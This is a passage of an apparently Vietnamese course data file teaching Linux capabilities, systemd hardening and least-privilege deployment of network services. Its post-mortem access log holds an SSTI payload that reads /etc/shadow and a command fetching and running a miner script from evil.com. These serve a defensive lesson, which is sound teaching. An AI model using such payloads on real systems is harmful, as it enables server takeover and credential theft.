          explanation: "Khi tiến trình cha tạo socket và gọi `fork()`, tiến trình con được sao chép bảng File Descriptor, trỏ chung vào một cấu trúc `struct file` và `struct socket` trong kernel. Nếu tiến trình cha dừng nhưng tiến trình con không thoát, reference count của socket vẫn lớn hơn 0 và cổng 8080 vẫn ở trạng thái LISTEN. Dùng `fuser -k` sẽ gửi tín hiệu SIGKILL trực tiếp tới tiến trình con đang giữ FD, giải phóng socket Inode về 0."
        }
      ],
      reflectionQuestion: "Tại sao lệnh read() và write() của Linux có thể vừa dùng để đọc/ghi một tệp text trên ổ cứng, vừa dùng để gửi/nhận dữ liệu qua card mạng? Kernel Linux đã dùng cấu trúc dữ liệu nào bên dưới để bắc cầu cho sự đa hình (polymorphism) kỳ diệu đó?",
      reflectionHint: "Kernel Linux hiện thực hóa tính đa hình thông qua Virtual File System (VFS). Mỗi File Descriptor trỏ tới một cấu trúc `struct file`. Cấu trúc này chứa con trỏ bảng hàm `f_op` (File Operations). Với regular file, `f_op` trỏ tới các hàm của driver đĩa (như `ext4_file_operations`). Với socket, `f_op` trỏ tới `socket_file_ops`, trong đó hàm `.read_iter` được gán bằng `sock_read_iter()` và `.write_iter` được gán bằng `sock_write_iter()`. Khi người dùng gọi `read()`, Kernel chỉ việc gọi `file->f_op->read_iter()`, chuyển hướng hoàn toàn luồng xử lý xuống Network Stack mà không cần người dùng đổi API!",
      summary: [
        "Mọi kết nối mạng trên Linux đều được đại diện bằng một con số nguyên gọi là File Descriptor (FD) trong User Space.",
        "Socket không phải là tệp trên đĩa cứng; nó là Inode ảo thuộc filesystem sockfs nằm hoàn toàn trong bộ nhớ RAM của Kernel.",
        "Virtual File System (VFS) sử dụng con trỏ hàm f_op (gán bằng socket_file_ops) để chuyển hướng các lệnh read()/write() quen thuộc thành các thao tác gửi/nhận gói tin trên Network Stack.",
        "Một cổng dịch vụ có 1 Listening Socket Inode để đón khách, và khi kết nối được thiết lập, kernel tạo thêm các Connected Socket Inode riêng biệt cho từng client.",
        "Lỗi 'Too many open files' xảy ra khi tổng số file và socket của tiến trình chạm trần nofile (mặc định 1024), có thể khắc phục bằng cách tăng ulimit và rlimit."
      ],
      nextLessonPreview: "Bài 0.2: Tiến trình mạng, Đặc quyền (Root vs Linux Capabilities) & Quản lý Dịch vụ với Systemd — Khám phá vì sao cổng < 1024 cần quyền root và cách dùng CAP_NET_BIND_SERVICE để chạy ứng dụng mạng an toàn mà không cần cấp quyền root toàn phần."
    },
    {
      id: "net-0-02",
      number: "0.2",
      title: "Tiến trình mạng, Đặc quyền (Root vs Linux Capabilities) & Systemd",
      subtitle: "Bảo mật dịch vụ mạng: Giải mã ranh giới cổng đặc quyền < 1024, CAP_NET_BIND_SERVICE và quản lý dịch vụ với Systemd Hardening",
      level: "Nền tảng",
      duration: "90 phút",
      objectives: [
        "Hiểu nguyên nhân lịch sử và cơ chế kỹ thuật vì sao cổng dưới 1024 (Privileged Ports) yêu cầu quyền hạn đặc biệt.",
        "Mô tả chính xác quy trình Linux Kernel kiểm tra quyền trong syscall bind() thông qua hàm ns_capable().",
        "Làm chủ cơ chế Linux Capabilities, thay thế việc chạy toàn quyền root bằng năng lực tối thiểu CAP_NET_BIND_SERVICE.",
        "Viết file Systemd Service Unit chuẩn production cho dịch vụ mạng: tự khởi động lại, cô lập User unprivileged và Sandbox filesystem.",
        "Sử dụng thành thạo journalctl để truy vết log dịch vụ và chẩn đoán lỗi gán cổng (bind failure)."
      ],
      intuition: {
        title: "Chìa Khóa Vạn Năng vs Thẻ Từ Phân Quyền RFID",
        metaphor: "Trong mô hình UNIX cổ điển, tài khoản root giống như một chiếc 'chìa khóa vạn năng' mở được tất cả các cửa: từ hòm thư trước cổng (cổng 80) cho đến phòng ngủ, két sắt gia đình và cầu dao điện tổng. Khi bạn chạy một web server bằng lệnh 'sudo', bạn đang trao chiếc chìa khóa vạn năng đó cho nhân viên trực hòm thư. Nếu nhân viên đó bị kẻ xấu thôi miên (lỗ hổng Remote Code Execution), kẻ đó sẽ dùng chiếc chìa khóa để chiếm đoạt toàn bộ ngôi nhà! Linux Capabilities ra đời giống như hệ thống thẻ từ RFID thông minh của khách sạn hiện đại: thay vì đưa chìa khóa tổng, bạn chỉ cấp cho nhân viên một tấm thẻ mở đúng hòm thư số 80 (CAP_NET_BIND_SERVICE). Dù nhân viên có bị khống chế, kẻ cướp vẫn hoàn toàn bất lực trước két sắt chứa dữ liệu hay cầu dao ngắt hệ thống.",
        visualHtml: `
          <div class="net-arch-box">
            <div class="net-arch-header">
              <span class="net-arch-icon">🛡️</span>
              <span class="net-arch-title">KIẾN TRÚC BẢO VỆ TIẾN TRÌNH: TRUYỀN THỐNG (ROOT) VS HIỆN ĐẠI (CAPABILITIES + SYSTEMD)</span>
            </div>
            <div class="net-arch-layers">
              <div class="net-arch-layer layer-userspace" style="border-left-color: var(--danger);">
                <div class="net-arch-layer-header">
                  <span class="net-arch-layer-name">❌ Cách Tiếp Cận Cũ &amp; Nguy Hiểm: Toàn Quyền Root (UID 0)</span>
                  <span class="net-arch-layer-badge" style="background: var(--danger); color: #fff;">Nguy Cơ RCE Chiếm Server</span>
                </div>
                <div class="net-arch-nodes">
                  <div class="net-arch-node"><code>sudo python3 app.py</code> ➔ Tiến trình sở hữu <strong>toàn bộ 40+ Capabilities</strong> (UID 0).</div>
                  <div class="net-arch-node">Lỗ hổng phần mềm ➔ Kẻ tấn công đọc <code>/etc/shadow</code>, xóa ổ cứng, cài Rootkit vào Kernel.</div>
                </div>
              </div>

              <div class="net-arch-arrow">⚡ vs ⚡</div>

              <div class="net-arch-layer layer-vfs" style="border-left-color: var(--success);">
                <div class="net-arch-layer-header">
                  <span class="net-arch-layer-name">✅ Cách Tiếp Cận Hiện Đại: Nguyên Tắc Đặc Quyền Tối Thiểu (Least Privilege)</span>
                  <span class="net-arch-layer-badge" style="background: var(--success); color: #fff;">An Toàn Tuyệt Đối</span>
                </div>
                <div class="net-arch-nodes">
                  <div class="net-arch-node"><strong>Systemd Unit:</strong> Chạy dưới User không đặc quyền <code>User=nobody</code> hoặc <code>DynamicUser=yes</code>.</div>
                  <div class="net-arch-node"><strong>Cấp Năng Lực Duy Nhất:</strong> <code>AmbientCapabilities=CAP_NET_BIND_SERVICE</code> (Chỉ được mở cổng &lt; 1024).</div>
                  <div class="net-arch-node"><strong>Filesystem Sandbox:</strong> <code>ProtectSystem=strict</code>, <code>ProtectHome=true</code>, <code>PrivateTmp=true</code>.</div>
                </div>
              </div>

              <div class="net-arch-arrow">⬇️ Syscall bind() xuống Linux Kernel</div>

              <div class="net-arch-layer layer-kernel">
                <div class="net-arch-layer-header">
                  <span class="net-arch-layer-name">🧠 Điểm Kiểm Tra An Ninh Nhân (Kernel Syscall Check: sys_bind)</span>
                  <span class="net-arch-layer-badge">net/ipv4/af_inet.c</span>
                </div>
                <div class="net-arch-nodes">
                  <div class="net-arch-node"><code>port &lt; 1024</code> ➔ Kernel gọi <code>ns_capable(net-&gt;user_ns, CAP_NET_BIND_SERVICE)</code>.</div>
                  <div class="net-arch-node">Có cờ <code>CAP_NET_BIND_SERVICE</code>? ➔ <strong>Cho phép (Return 0)</strong>. Không có? ➔ <strong>Chặn (Return -EACCES: Permission denied)</strong>.</div>
                </div>
              </div>
            </div>
          </div>
        `
      },
      sections: [
        {
          id: "sec-problem",
          title: "Vấn đề thực tế: Ranh giới cổng < 1024 và thảm họa 'sudo python'",
          content: `
            <p>Khi bạn bắt đầu học lập trình mạng hoặc dựng một ứng dụng web trên Linux bằng Python, Node.js hay Go, bạn sẽ nhanh chóng chạm phải lỗi này nếu cố lắng nghe trên cổng 80 (HTTP) hoặc 443 (HTTPS):</p>
            <pre class="code-pre"><code>PermissionError: [Errno 13] Permission denied</code></pre>
            <p>Cách giải quyết 'truyền miệng' nhanh nhất nhưng nguy hiểm nhất của nhiều lập trình viên là: <em>Thêm <code>sudo</code> vào trước câu lệnh!</em></p>
            <pre class="code-pre"><code>$ sudo python3 -m http.server 80</code></pre>
            
            <p><strong>Nguồn gốc lịch sử của ranh giới cổng 1024:</strong></p>
            <p>Tại sao lại là con số 1024 mà không phải 100 hay 5000? Vào đầu thập niên 1980 tại Đại học Berkeley, trong các hệ thống mạng dùng chung (như BSD UNIX), các dịch vụ quản trị từ xa thời bấy giờ (<code>rlogin</code>, <code>rsh</code>, <code>rcp</code>) xác thực người dùng dựa trên địa chỉ IP nguồn và cổng nguồn. Các nhà thiết kế quy ước: <em>Các cổng từ 0 đến 1023 chỉ có tiến trình do quản trị viên (root) khởi chạy mới được phép sử dụng</em>. Khi máy chủ nhận được yêu cầu từ cổng &lt; 1024 của máy khác, nó tin rằng yêu cầu đó đến từ người dùng đáng tin cậy.</p>

            <p><strong>Hiểm họa bảo mật khi chạy ứng dụng bằng quyền root:</strong></p>
            <p>Ngày nay, ranh giới đó vẫn được giữ lại làm chuẩn mặc định trong nhân Linux. Nhưng việc chạy toàn bộ ứng dụng web dưới quyền <code>root</code> vi phạm nguyên tắc sống còn trong an ninh mạng: <strong>Nguyên tắc đặc quyền tối thiểu (Principle of Least Privilege)</strong>.</p>
            <ul>
              <li>Một ứng dụng web phức tạp chứa hàng ngàn thư viện phụ thuộc (npm packages, pip packages). Bất kỳ một lỗ hổng chèn mã từ xa (RCE) hay đọc file tùy ý (Path Traversal) nào cũng cho phép kẻ tấn công thực thi mã với tư cách là <code>root</code>.</li>
              <li>Khi có quyền <code>root</code>, kẻ tấn công có thể đọc mật khẩu trong <code>/etc/shadow</code>, xóa phân vùng đĩa, nạp Kernel Module độc hại, hoặc biến máy chủ thành bàn đạp tấn công mạng nội bộ doanh nghiệp.</li>
            </ul>
          `
        },
        {
          id: "sec-mechanism",
          title: "Cơ chế kỹ thuật: Giải phẫu Kernel Check & Linux Capabilities",
          content: `
            <p>Để giải bài toán nhức nhối 'Cần mở cổng thấp nhưng không muốn cấp quyền root toàn phần', chuẩn POSIX 1003.1e và nhân Linux (từ bản 2.2) đã phát minh ra: <strong>Linux Capabilities</strong>.</p>
            
            <p>Thay vì xem quyền quản trị là một khối nguyên khối (Monolithic UID 0: hoặc là không có gì, hoặc là có tất cả), Linux chia nhỏ quyền hạn của root thành hơn 40 'mảnh năng lực' (Capabilities) riêng biệt:</p>
            <ul>
              <li><code>CAP_NET_BIND_SERVICE</code>: Chỉ cấp quyền bind socket vào cổng &lt; 1024. Tuyệt đối không cho đọc file của root, không cho tắt máy hay can thiệp tiến trình khác.</li>
              <li><code>CAP_NET_RAW</code>: Cho phép tạo Raw Socket và ICMP Socket (dùng cho <code>ping</code> và <code>tcpdump</code>).</li>
              <li><code>CAP_NET_ADMIN</code>: Cho phép cấu hình card mạng, bảng định tuyến, firewall nftables.</li>
              <li><code>CAP_SYS_ADMIN</code>: Năng lực quản trị hệ thống đa năng (tương đương 80% quyền root).</li>
              <li><code>CAP_DAC_OVERRIDE</code>: Bỏ qua kiểm tra quyền đọc/ghi/thực thi file (rwx).</li>
            </ul>

            <p><strong>Hành trình kiểm tra quyền hạn bên trong Linux Kernel khi gọi <code>bind()</code>:</strong></p>
            <p>Trong mã nguồn nhân Linux (file <code>net/ipv4/af_inet.c</code>, hàm <code>inet_bind()</code>):</p>
            <div class="net-topo-box">
              <div class="net-topo-title">⚙️ LUỒNG KIỂM TRA QUYỀN BIND SOCKET CỦA KERNEL</div>
              <ol style="margin:0;padding-left:20px;line-height:1.7;">
                <li>Tiến trình gọi <code>bind(fd, (struct sockaddr*)&addr, sizeof(addr))</code> với port = 80.</li>
                <li>Kernel lấy tham số sysctl <code>net.ipv4.ip_unprivileged_port_start</code> (mặc định là 1024).</li>
                <li>Nếu <code>port &lt; ip_unprivileged_port_start</code>, Kernel thực thi lệnh kiểm tra:
                  <pre class="code-pre"><code>if (snum &lt; inet_prot_sock(net) &amp;&amp; !ns_capable(net-&gt;user_ns, CAP_NET_BIND_SERVICE))
    return -EACCES;</code></pre>
                </li>
                <li>Nếu tiến trình sở hữu <code>CAP_NET_BIND_SERVICE</code> trong tập <em>Effective Set</em>, Kernel cho phép tiếp tục gán cổng. Ngược lại, trả về mã lỗi <code>-EACCES</code> (Permission denied).</li>
              </ol>
            </div>

            <p><strong>4 Tập hợp Capabilities của mỗi tiến trình (task_struct->cred):</strong></p>
            <ul>
              <li><strong>Permitted (P)</strong>: Tập hợp trần tối đa các năng lực mà tiến trình có thể sử dụng.</li>
              <li><strong>Effective (E)</strong>: Tập hợp các năng lực đang thực sự có hiệu lực tại thời điểm hiện tại (Kernel kiểm tra tập này).</li>
              <li><strong>Inheritable (I)</strong>: Tập hợp các năng lực được bảo lưu khi gọi <code>execve()</code> để truyền cho binary khác (thường kết hợp với file capabilities).</li>
              <li><strong>Ambient (A)</strong>: Được bổ sung từ Linux 4.3, cho phép tiến trình không phải root truyền capabilities cho tiến trình con qua <code>execve()</code> mà không cần gán cờ lên file thực thi. Đây chính là chìa khóa để Systemd cấp quyền an toàn cho Python/Node.js!</li>
            </ul>
          `
        },
        {
          id: "sec-walkthrough",
          title: "Ví dụ số liệu cụ thể: Ma trận quyền hạn Root vs Capabilities vs Bounding Set",
          content: `
            <p>Hãy cùng đối chiếu trực quan 3 kịch bản triển khai dịch vụ web trên cùng cổng 80 để thấy rõ sự khác biệt về diện tích bề mặt tấn công (Attack Surface):</p>
            <table class="net-matrix-table">
              <thead>
                <tr>
                  <th>Tiêu chí đánh giá</th>
                  <th>Kịch bản 1: Chạy <code>sudo python</code></th>
                  <th>Kịch bản 2: Gán <code>setcap</code> lên binary</th>
                  <th class="net-highlight-cell">Kịch bản 3: Systemd Ambient Capabilities</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td><strong>User sở hữu (UID)</strong></td>
                  <td><code>root</code> (UID 0)</td>
                  <td><code>nobody</code> (UID 65534)</td>
                  <td class="net-highlight-cell"><code>www-data</code> hoặc <code>DynamicUser=yes</code></td>
                </tr>
                <tr>
                  <td><strong>Quyền Bind cổng 80/443</strong></td>
                  <td>Có (Do UID 0)</td>
                  <td>Có (Do file mang capability)</td>
                  <td class="net-highlight-cell">Có (Do Systemd kích hoạt Ambient)</td>
                </tr>
                <tr>
                  <td><strong>Quyền đọc file nhạy cảm</strong></td>
                  <td>Đọc được mọi file (kể cả <code>/etc/shadow</code>)</td>
                  <td>Bị chặn bởi Linux File Permission thông thường</td>
                  <td class="net-highlight-cell">Bị chặn tuyệt đối + Sandbox Filesystem</td>
                </tr>
                <tr>
                  <td><strong>Nguy cơ khi bị RCE</strong></td>
                  <td>💥 <strong>Toàn bộ hệ thống bị chiếm đoạt</strong></td>
                  <td>⚠️ Kẻ tấn công có thể chạy shell dưới user thường</td>
                  <td class="net-highlight-cell">🛡️ <strong>Kẻ tấn công bị kẹt trong sandbox cô lập</strong></td>
                </tr>
                <tr>
                  <td><strong>Tính linh hoạt khi nâng cấp</strong></td>
                  <td>Rất kém, thói quen xấu</td>
                  <td>Dễ mất cờ <code>setcap</code> khi binary được cập nhật (apt/pip)</td>
                  <td class="net-highlight-cell">Bền vững, cấu hình tập trung trong Service Unit</td>
                </tr>
              </tbody>
            </table>
          `
        },
        {
          id: "sec-observe",
          title: "Quan sát trên Linux: Khám phá Capabilities & Kiểm tra trạng thái Socket",
          content: `
            <p>Linux cung cấp bộ công cụ dòng lệnh <code>libcap2-bin</code> (chứa <code>getcap</code>, <code>setcap</code>, <code>capsh</code>, <code>getpcaps</code>) để bạn trực tiếp khám phá các quyền năng này.</p>
          `,
          codeExamples: [
            {
              title: "Xem Capabilities của các công cụ mạng quen thuộc trên hệ thống",
              code: "getcap /bin/ping /usr/bin/traceroute6.iputils /usr/bin/dumpcap 2>/dev/null",
              output: "/bin/ping cap_net_raw+ep\n/usr/bin/dumpcap cap_net_admin,cap_net_raw+eip",
              annotations: [
                { line: 1, text: "Lệnh getcap quét xem file thực thi có được gán Capability độc lập không." },
                { line: 2, text: "/bin/ping chỉ cần đúng cap_net_raw để gửi ICMP Echo Request, không cần chạy toàn quyền root!" },
                { line: 3, text: "dumpcap (công cụ thu gói của Wireshark) chỉ cần cap_net_admin, cap_net_raw để bắt gói tin." }
              ]
            },
            {
              title: "Soi Capabilities của một tiến trình đang chạy theo PID",
              code: "# Giả sử tiến trình web server có PID là 1420\ngetpcaps 1420",
              output: "1420: cap_net_bind_service=ep",
              annotations: [
                { line: 2, text: "Lệnh getpcaps đọc trường CapEff, CapPrm trong /proc/<PID>/status và giải mã ra tên Capability." },
                { line: 3, text: "Chỉ có duy nhất cap_net_bind_service có hiệu lực (+ep: effective & permitted). Tuyệt đối an toàn!" }
              ]
            },
            {
              title: "Kiểm tra ngưỡng cổng đặc quyền của hệ thống qua Sysctl",
              code: "sysctl net.ipv4.ip_unprivileged_port_start",
              output: "net.ipv4.ip_unprivileged_port_start = 1024",
              annotations: [
                { line: 1, text: "Tham số kernel quy định từ cổng nào trở đi là cổng không đặc quyền." },
                { line: 2, text: "Giá trị 1024 là chuẩn quốc tế từ thập niên 1980." }
              ]
            }
          ]
        },
        {
          id: "sec-lab",
          title: "Phòng Lab thực hành: Chạy Web Server cổng 80 an toàn với Systemd Hardening",
          content: `
            <p>Trong bài lab thực hành này, bạn sẽ tự tay dựng một Web Server Python lắng nghe trên cổng đặc quyền 80, nhưng chạy dưới quyền người dùng không đặc quyền <code>nobody</code> và được bảo vệ nghiêm ngặt bằng Systemd Hardening.</p>

            <div class="net-step-card">
              <div class="net-step-badge">BƯỚC 1</div>
              <h4 class="net-step-title">Tạo mã nguồn máy chủ Web mini bằng Python</h4>
              <p class="net-step-desc">Tạo một script Python đơn giản lắng nghe trên cổng 80 và in ra thông tin tiến trình.</p>
              <pre class="code-pre"><code>sudo tee /opt/web-service.py &gt; /dev/null &lt;&lt; 'EOF'
import http.server
import os

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        uid = os.getuid()
        gid = os.getgid()
        msg = f"&lt;h1&gt;Xin chao tu Linux Network Lab!&lt;/h1&gt;&lt;p&gt;Tien trinh dang chay voi UID: &lt;b&gt;{uid}&lt;/b&gt;, GID: &lt;b&gt;{gid}&lt;/b&gt;&lt;/p&gt;"
        self.wfile.write(msg.encode('utf-8'))

print("Khoi dong HTTP Server tai cong 80...")
server = http.server.HTTPServer(('0.0.0.0', 80), CustomHandler)
server.serve_forever()
EOF</code></pre>
              <div class="net-verify-box">
                <span class="net-verify-icon">✓</span>
                <span><strong>Kiểm tra:</strong> File <code>/opt/web-service.py</code> đã được tạo thành công và có quyền đọc.</span>
              </div>
            </div>

            <div class="net-step-card">
              <div class="net-step-badge">BƯỚC 2</div>
              <h4 class="net-step-title">Viết file Systemd Service Unit với AmbientCapabilities &amp; Sandbox</h4>
              <p class="net-step-desc">Tạo file cấu hình dịch vụ Systemd, kích hoạt năng lực bind cổng và khóa chặt hệ thống file.</p>
              <pre class="code-pre"><code>sudo tee /etc/systemd/system/safe-web.service &gt; /dev/null &lt;&lt; 'EOF'
[Unit]
Description=Safe Web Service Running on Port 80
After=network.target

[Service]
Type=simple
User=nobody
Group=nogroup
ExecStart=/usr/bin/python3 /opt/web-service.py
Restart=always
RestartSec=3

# Cấp năng lực mở cổng < 1024 mà không cần quyền Root
AmbientCapabilities=CAP_NET_BIND_SERVICE
CapabilityBoundingSet=CAP_NET_BIND_SERVICE

# Kỹ thuật Systemd Hardening Sandbox
ProtectSystem=strict
ProtectHome=true
PrivateTmp=true
NoNewPrivileges=true

[Install]
WantedBy=multi-user.target
EOF</code></pre>
              <div class="net-verify-box">
                <span class="net-verify-icon">✓</span>
                <span><strong>Ý nghĩa:</strong> <code>User=nobody</code> (UID 65534) nhưng nhờ <code>AmbientCapabilities=CAP_NET_BIND_SERVICE</code>, tiến trình vẫn mở được cổng 80.</span>
              </div>
            </div>

            <div class="net-step-card">
              <div class="net-step-badge">BƯỚC 3</div>
              <h4 class="net-step-title">Nạp lại Systemd, Khởi động và Kiểm chứng Dịch vụ</h4>
              <p class="net-step-desc">Kích hoạt dịch vụ và dùng cURL kiểm tra UID mà web server trả về.</p>
              <pre class="code-pre"><code>sudo systemctl daemon-reload
sudo systemctl restart safe-web.service
sudo systemctl status safe-web.service --no-pager
curl -s http://127.0.0.1/ | grep -o "UID:.*"</code></pre>
              <div class="net-verify-box">
                <span class="net-verify-icon">✓</span>
                <span><strong>Kết quả mong đợi:</strong> cURL trả về <code>UID: &lt;b&gt;65534&lt;/b&gt;</code> (chính là tài khoản nobody)! Web server chạy trên cổng 80 nhưng hoàn toàn không mang quyền root!</span>
              </div>
            </div>

            <div class="net-step-card">
              <div class="net-step-badge">BƯỚC 4</div>
              <h4 class="net-step-title">Thử nghiệm Chống Lỗi (Auto-Restart &amp; Log Tracing)</h4>
              <p class="net-step-desc">Cố tình bắn tín hiệu tiêu diệt tiến trình (kill -9) và quan sát Systemd tự động hồi sinh dịch vụ.</p>
              <pre class="code-pre"><code># Tìm PID và tiêu diệt tiến trình
PID=$(pgrep -f "web-service.py")
echo "Tieu diet tien trinh PID: $PID"
sudo kill -9 $PID

# Đợi 4 giây và kiểm tra lại trạng thái
sleep 4
sudo systemctl status safe-web.service --no-pager | grep "Active:"
# Xem nhật ký phục hồi qua journalctl
journalctl -u safe-web.service -n 10 --no-pager</code></pre>
              <div class="net-verify-box">
                <span class="net-verify-icon">✓</span>
                <span><strong>Kết quả mong đợi:</strong> Dịch vụ lập tức chuyển sang trạng thái <code>active (running)</code> với một PID mới toanh sau 3 giây. Log journalctl ghi nhận rõ tiến trình bị kill và tự phục hồi.</span>
              </div>
            </div>
          `
        },
        {
          id: "sec-production",
          title: "Môi trường Production & Ca sự cố: Bệnh án máy chủ bị kiểm soát qua lỗ hổng RCE",
          content: `
            <div class="net-postmortem-card">
              <div class="net-postmortem-header">
                <span class="net-postmortem-tag">🚨 SRE POST-MORTEM</span>
                <h3 class="net-postmortem-title">Sự cố rò rỉ dữ liệu khách hàng do Web Application chạy dưới quyền Root</h3>
              </div>
              <div class="net-postmortem-body">
                <p><strong>Bối cảnh sự cố:</strong> Một công ty tài chính triển khai cổng API thanh toán nội bộ chạy bằng Python Flask trực tiếp trên cổng 443. Để thuận tiện cho việc bind cổng 443, đội ngũ phát triển đã viết script triển khai: <code>nohup sudo python3 api.py &gt; log.txt 2&gt;&amp;1 &amp;</code>.</p>
                
                <p><strong>Triệu chứng &amp; Dấu vết xâm nhập:</strong></p>
                <div class="net-terminal-box">
                  <div class="net-terminal-bar">
                    <span class="net-terminal-dot red"></span>
                    <span class="net-terminal-dot yellow"></span>
                    <span class="net-terminal-dot green"></span>
                    <span class="net-terminal-title">Access Log trích xuất từ máy chủ bị tấn công</span>
                  </div>
                  <pre class="net-terminal-content"><code>192.168.1.105 - - [14/Oct/2025:03:15:22] "POST /api/v1/render HTTP/1.1" 200 -
192.168.1.105 - - [14/Oct/2025:03:16:01] "POST /api/v1/render?template={{config.__class__.__init__.__globals__['os'].popen('cat /etc/shadow').read()}}" 200 -
192.168.1.105 - - [14/Oct/2025:03:17:45] "GET /api/v1/render?cmd=curl+http://evil.com/miner.sh|sh" 200 -</code></pre>
                </div>

                <p><strong>Phân tích nguyên nhân gốc rễ (Root Cause):</strong></p>
                <ul>
                  <li>Ứng dụng dính lỗ hổng mẫu Server-Side Template Injection (SSTI) cho phép thực thi mã lệnh hệ thống tùy ý.</li>
                  <li>Do ứng dụng chạy bằng <code>sudo</code> (UID 0), mã độc thực thi với toàn quyền root! Kẻ tấn công đọc trọn vẹn tệp băm mật khẩu <code>/etc/shadow</code> và tải về mã độc đào tiền ảo chiếm dụng 100% CPU.</li>
                  <li>Nếu ứng dụng được chạy dưới user <code>www-data</code> và chỉ cấp <code>CAP_NET_BIND_SERVICE</code> kèm <code>ProtectSystem=strict</code>, lệnh <code>cat /etc/shadow</code> sẽ bị Kernel từ chối ngay lập tức (Permission Denied) và mã độc không thể ghi vào đĩa!</li>
                </ul>

                <p><strong>Toa thuốc điều trị triệt để:</strong></p>
                <ol>
                  <li>Chuyển toàn bộ ứng dụng sang quản lý bằng Systemd Service Unit với <code>User=www-data</code>.</li>
                  <li>Áp dụng <code>AmbientCapabilities=CAP_NET_BIND_SERVICE</code> để bind cổng 443 an toàn.</li>
                  <li>Bật <code>ProtectSystem=strict</code> (biến toàn bộ filesystem thành Read-Only đối với tiến trình) và <code>PrivateTmp=true</code> (cô lập thư mục /tmp).</li>
                  <li>Thiết lập bộ lọc cảnh báo nhật ký tự động qua <code>journalctl</code> tích hợp SIEM.</li>
                </ol>
              </div>
            </div>
          `
        }
      ],
      callouts: {
        pitfalls: [
          {
            title: "Cạm bẫy khi chạy Container Docker với cờ --privileged",
            content: "Nhiều kỹ sư khi gặp lỗi quyền hạn trong Docker container liền thêm cờ <code>docker run --privileged</code>. Cờ này cấp cho container toàn bộ 40+ Capabilities của máy chủ thật và cho phép truy cập trực tiếp các thiết bị trong <code>/dev</code>, phá vỡ hoàn toàn hàng rào cô lập. Thay vào đó, bạn chỉ nên cấp đúng năng lực cần thiết bằng cờ <code>--cap-add=NET_BIND_SERVICE</code>."
          },
          {
            title: "Quên AmbientCapabilities khi chạy Script qua Bash/Python",
            content: "Nếu trong Systemd bạn chỉ đặt <code>CapabilityBoundingSet=CAP_NET_BIND_SERVICE</code> mà quên <code>AmbientCapabilities=CAP_NET_BIND_SERVICE</code>, khi Systemd gọi trình thông dịch <code>/usr/bin/python3</code>, năng lực đó sẽ bị rơi rụng qua lời gọi hàm <code>execve()</code>, dẫn đến script Python bên trong vẫn bị lỗi Permission Denied."
          }
        ],
        tips: [
          {
            title: "Hạ ngưỡng cổng không đặc quyền trong môi trường Dev",
            content: "Nếu bạn đang làm việc trên máy tính cá nhân hoặc môi trường phát triển và muốn bind cổng 80 tùy thích mà không cần cấu hình Systemd hay root, bạn có thể chạy: <code>sudo sysctl -w net.ipv4.ip_unprivileged_port_start=80</code>. Kể từ lúc này, mọi user thường đều có thể mở cổng từ 80 trở lên!"
          },
          {
            title: "Tự động sinh User tạm thời với DynamicUser=yes",
            content: "Trong Systemd hiện đại, thay vì phải tạo user thủ công bằng lệnh <code>useradd</code>, bạn chỉ cần ghi <code>DynamicUser=yes</code> trong file Service Unit. Systemd sẽ tự động cấp một UID ngẫu nhiên khi dịch vụ khởi động và tự động thu hồi khi dừng, mang lại độ bảo mật cao nhất."
          }
        ]
      },
      exercises: [
        {
          level: "Dễ",
          title: "Kiểm tra Capabilities của công cụ hệ thống",
          problem: "Hãy dùng lệnh getcap để kiểm tra xem file thực thi /bin/ping và /usr/bin/gnome-keyring-daemon trên máy bạn sở hữu những capability nào.",
          hint: "Chạy getcap kèm đường dẫn file, lưu ý thêm 2>/dev/null để lọc bỏ các thông báo lỗi truy cập.",
          solutionCode: "getcap /bin/ping 2>/dev/null",
          explanation: "Thông thường trên các bản Linux hiện đại, /bin/ping sẽ có cap_net_raw+ep, cho phép nó tạo raw socket ICMP mà không cần đặt cờ SUID root nguy hiểm."
        },
        {
          level: "Vừa",
          title: "Cấp quyền bind cổng 80 cho file thực thi độc lập bằng setcap",
          problem: "Sao chép binary Python ra thư mục cá nhân và dùng lệnh setcap cấp đúng quyền CAP_NET_BIND_SERVICE cho binary này, sau đó chạy thử lệnh python3 -m http.server 80 dưới tài khoản thường.",
          hint: "Dùng sudo setcap 'cap_net_bind_service=+ep' <đường-dẫn-file>.",
          solutionCode: "cp /usr/bin/python3 ~/my-python\nsudo setcap 'cap_net_bind_service=+ep' ~/my-python\n~/my-python -m http.server 80",
          explanation: "Lệnh setcap ghi thuộc tính mở rộng (Extended Attribute security.capability) trực tiếp vào Inode của file trên đĩa. Khi thực thi, Kernel tự động nạp capability này vào tập Effective của tiến trình."
        },
        {
          level: "Thử thách",
          title: "Cấu hình Systemd Service cô lập tuyệt đối cho dịch vụ mạng",
          problem: "Viết một service unit cho một tiến trình lắng nghe cổng 80 với các ràng buộc: chạy DynamicUser, chỉ cấp CAP_NET_BIND_SERVICE, cấm tuyệt đối tạo file mới trong toàn bộ hệ thống trừ /tmp, và tự khởi động lại sau 2 giây nếu bị dừng đột ngột.",
          hint: "Sử dụng DynamicUser=yes, AmbientCapabilities=CAP_NET_BIND_SERVICE, CapabilityBoundingSet=CAP_NET_BIND_SERVICE, ProtectSystem=strict, PrivateTmp=true, Restart=always, RestartSec=2.",
          solutionCode: "[Unit]\nDescription=Ultra Secure Microservice\nAfter=network.target\n\n[Service]\nExecStart=/usr/bin/python3 -m http.server 80\nDynamicUser=yes\nAmbientCapabilities=CAP_NET_BIND_SERVICE\nCapabilityBoundingSet=CAP_NET_BIND_SERVICE\nProtectSystem=strict\nPrivateTmp=true\nRestart=always\nRestartSec=2\n\n[Install]\nWantedBy=multi-user.target",
          explanation: "Đây là mẫu cấu hình Systemd Service Hardening mẫu mực cho các microservices hiện đại trên môi trường production, kết hợp hoàn hảo giữa năng lực mạng tối thiểu và sandbox hệ thống tệp."
        }
      ],
      reflectionQuestion: "Nếu Linux có thể chia nhỏ quyền hạn bằng Capabilities chi tiết đến vậy, tại sao trong thực tế nhiều lập trình viên và quản trị viên vẫn quen tay gõ 'sudo python' hoặc chạy container với cờ '--privileged'? Hãy phân tích sự đánh đổi giữa tính tiện dụng nhất thời (Convenience) và cái giá bảo mật thực chất (Security).",
